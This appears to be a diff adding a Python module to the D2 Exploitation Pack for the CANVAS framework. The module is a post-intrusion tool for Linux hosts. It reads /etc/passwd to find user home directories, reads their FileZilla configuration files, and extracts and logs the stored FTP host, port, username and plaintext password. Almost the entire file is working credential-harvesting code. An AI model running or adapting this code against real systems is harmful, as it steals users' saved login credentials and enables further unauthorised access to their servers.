@@ -1,0 +1,135 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, os
+import pygtk
+import gobject
+import re
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "D2 FTP accounts"
+DESCRIPTION = "D2 FTP accounts on a Node"
+VERSION = "1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = None
+DOCUMENTATION["Date public"] = None
+DOCUMENTATION["CERT Advisory"] = None
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = None
+DOCUMENTATION["CVE Name"] = None
+DOCUMENTATION["CVE Url"] = None
+DOCUMENTATION["Notes"] = """
+Support only Linux node at this moment.
+"""
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['SITE'] = "Local" 
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+ACCOUNT = {}
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.node = None
+		self.supportedNodeArgs = [["linuxNode"]]
+		self.name = NAME
+		self.home = []
+
+	def filezilla(self, home):
+		host = port = user = passwd = ''
+		files = ['filezilla.xml', 'sitemanager.xml']
+
+		for file in files:
+			self.std = self.node.runcommand("/bin/cat %s/.filezilla/%s" % (home, file))
+			lines = self.std.split('\n')		
+
+			for line in lines:
+				rehost = re.compile('(.*)<Host>(.*)</Host>', re.I)
+				report = re.compile('(.*)<Port>(.*)</Port>', re.I)
+				reuser = re.compile('(.*)<User>(.*)</User>', re.I)
+				repass = re.compile('(.*)<Pass>(.*)</Pass>', re.I)
+				m = rehost.search(line)
+				if m:
+					host = m.group(2)
+				m = report.search(line)
+				if m:
+					port = m.group(2)
+				m = reuser.search(line)
+				if m:
+					user = m.group(2)
+				m = repass.search(line)
+				if m:
+					passwd = m.group(2)
+				if host and port and user and passwd:
+					if host not in ACCOUNT:
+						ACCOUNT[host] = [port, user, passwd]
+		return
+
+	def search_ftp_client_config(self):
+		ftpclient = {}
+		ftpclient['.filezilla'] = self.filezilla
+
+		for home in self.home:
+			for location, parser in ftpclient.items():
+				self.std = self.node.runcommand("ls -alp %s/%s" % (home, location))	
+				if "filezilla.xml" in self.std:
+					parser(home)
+		return
+
+	def get_users(self):
+		notusers = [
+			'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail',
+			'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc',
+			'gnats', 'nobody', 'Debian-exim', 'statd', 'avahi-autoip',
+			'messagebus'
+		]
+		users = self.node.runcommand("cat /etc/passwd")
+		users = users.split('\n')
+		for user in users:
+			if user:
+				user = user.split(':')
+				if user[0] not in notusers:
+					self.home.append(user[5])
+		return
+
+	def display_accounts(self):
+		for host, account in ACCOUNT.items():
+			self.log("[D2 LOG] %s:%s -> user:%s, pass:%s" % (host, account[0], account[1], account[2]))
+
+	def run(self):
+		self.setInfo('%s (in progress)' % NAME)
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			if type not in self.supportedNodeArgs[0]:
+				self.log("[D2 LOG] %s node type not supported" % type)
+				continue
+			self.node = node
+
+			self.get_users()
+			self.search_ftp_client_config()
+			self.display_accounts()
+		self.setInfo('%s (success)' % NAME)
+		return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
